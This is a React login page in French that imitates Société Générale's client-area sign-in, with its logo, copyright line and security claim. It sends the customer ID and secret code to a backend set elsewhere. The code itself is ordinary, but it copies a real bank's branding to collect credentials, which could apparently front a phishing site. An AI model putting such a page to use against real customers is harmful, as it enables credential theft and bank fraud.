import { useState } from 'react';
import SGLogo from '../components/SGLogo';
import { Eye, EyeOff, LockKeyhole } from 'lucide-react';
import { API_BASE_URL } from '../config/api';

const API_URL = `${API_BASE_URL}/api/auth/login`;

export default function LoginPage({ initialIdentifier = '', onLoginSuccess }) {
  const [identifierClient, setIdentifierClient] = useState(initialIdentifier || '5418759624');
  const [secretCode, setSecretCode] = useState('');
  const [showSecret, setShowSecret] = useState(false);
  const [rememberId, setRememberId] = useState(Boolean(initialIdentifier));
  const [message, setMessage] = useState('');
  const [status, setStatus] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (event) => {
    event.preventDefault();
    setLoading(true);
    setMessage('');
    setStatus('');

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ identifierClient, secretCode, rememberId })
      });

      const data = await response.json();

      if (!response.ok) {
        setStatus('error');
        setMessage(data.message || 'Erreur de connexion.');
      } else {
        setStatus('success');
        setMessage(data.message || 'Connexion réussie.');
        onLoginSuccess?.(data.token, rememberId, identifierClient);
      }
    } catch (error) {
      setStatus('error');
      setMessage('Impossible de joindre le serveur.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="mobile-frame flex items-center justify-center bg-white px-5">
      <div className="w-full rounded-3xl bg-white p-7 shadow-2xl ring-1 ring-gray-100">
        <div className="mb-7 text-center">
          <SGLogo width={68} height={68} className="mx-auto mb-4" />
          <h1 className="text-2xl font-extrabold text-gray-950">Votre espace client</h1>
          <p className="mt-2 text-sm font-medium text-gray-500">Connectez-vous à votre compte</p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label htmlFor="identifierClient" className="label">Identifiant client</label>
            <input
              id="identifierClient"
              type="text"
              value={identifierClient}
              onChange={(e) => setIdentifierClient(e.target.value)}
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder="5418759624"
              required
              className="input text-lg font-semibold"
            />
          </div>

          <div>
            <label htmlFor="secretCode" className="label">Code secret</label>
            <div className="relative">
              <input
                id="secretCode"
                type={showSecret ? 'text' : 'password'}
                value={secretCode}
                onChange={(e) => setSecretCode(e.target.value)}
                placeholder="Entrez votre code secret"
                required
                className="input pr-12 text-lg font-semibold"
              />
              <button
                type="button"
                onClick={() => setShowSecret(!showSecret)}
                className="absolute right-3 top-1/2 grid h-9 w-9 -translate-y-1/2 place-items-center rounded-full text-gray-400 hover:bg-gray-100 hover:text-gray-700"
                aria-label={showSecret ? 'Masquer' : 'Afficher'}
              >
                {showSecret ? <EyeOff size={19} /> : <Eye size={19} />}
              </button>
            </div>
          </div>

          <div className="flex items-center justify-between gap-4 text-sm">
            <label className="flex cursor-pointer items-center gap-2 font-semibold text-gray-700">
              <input
                type="checkbox"
                checked={rememberId}
                onChange={(e) => setRememberId(e.target.checked)}
                className="h-4 w-4 rounded border-gray-300 accent-primary-500"
              />
              Mémoriser mon ID
            </label>
            <button type="button" className="font-bold text-primary-600">
              Code oublié ?
            </button>
          </div>

          {message && (
            <div className={`rounded-2xl border p-3 text-sm font-semibold ${
              status === 'success'
                ? 'border-green-200 bg-green-50 text-green-700'
                : 'border-red-200 bg-red-50 text-red-700'
            }`}>
              {message}
            </div>
          )}

          <button type="submit" disabled={loading} className="btn-primary btn-lg w-full gap-2">
            <LockKeyhole size={18} />
            {loading ? 'Connexion en cours...' : 'Se connecter'}
          </button>
        </form>

        <div className="mt-7 border-t border-gray-100 pt-5 text-center text-xs font-medium leading-5 text-gray-500">
          <p>Connexion sécurisée SSL 256 bits</p>
          <p>© Société Générale - Tous droits réservés</p>
        </div>
      </div>
    </div>
  );
}
